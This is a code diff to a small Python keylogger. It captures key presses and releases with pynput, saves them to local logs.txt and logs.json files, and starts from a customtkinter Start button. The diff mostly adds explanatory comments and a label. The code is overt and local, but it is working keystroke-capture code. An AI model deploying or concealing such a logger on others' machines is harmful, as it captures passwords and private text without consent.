@@ -1,8 +1,9 @@
-import tkinter as tk
 from tkinter import *
-import customtkinter
-from pynput import keyboard
-import json
+#To create modern GUI
+import customtkinter 
+#To track keyboard inputs
+from pynput import keyboard 
+import json 
 
 customtkinter.set_default_color_theme("green")
 
@@ -14,15 +15,18 @@ key_list = []
 x = False #Value to determine if held
 key_strokes = ""
 
-def update_txt_file(key):
+#To store key strokes in a text file
+def update_txt_file(key): 
     with open('logs.txt', 'w+') as key_stroke:
         key_stroke.write(key)
 
+#To store key strokes in a json file
 def update_json_file(key_list):
     with open('logs.json', '+wb') as key_log:
         key_list_bytes = json.dumps(key_list).encode()
         key_log.write(key_list_bytes)
 
+#To determine what happens when a key is pressed and held
 def on_press(key):
     global x, key_list
     if x == False:
@@ -38,6 +42,7 @@ def on_press(key):
         )
     update_json_file(key_list)
 
+#To determine what happens when the key is released
 def on_release(key):
     global x, key_list, key_strokes
     key_list.append(
@@ -51,6 +56,7 @@ def on_release(key):
     key_strokes = key_strokes + str(key)
     update_txt_file(str(key_strokes))
 
+#Starting the keylogger when the start button is pressed
 def butaction():
 
     print("[+] Running Keylogger Successfuly!\n[!] Saving the Released key logs in 'logs.txt\n[!] Saving the Pressed, Held and Released key logs in 'logs.json'")
@@ -60,6 +66,9 @@ def butaction():
             on_release = on_release) as listener:
         listener.join()
 
+#Styling of GUI
+label = customtkinter.CTkLabel(root, text="Press the Start button to start the Key Logging")
+label.place(relx = 0.5, rely = 0.4, anchor = CENTER)
 button = customtkinter.CTkButton(root, text = "Start", command = butaction)
 button.place(relx = 0.5, rely = 0.5, anchor = CENTER)
 root.mainloop()
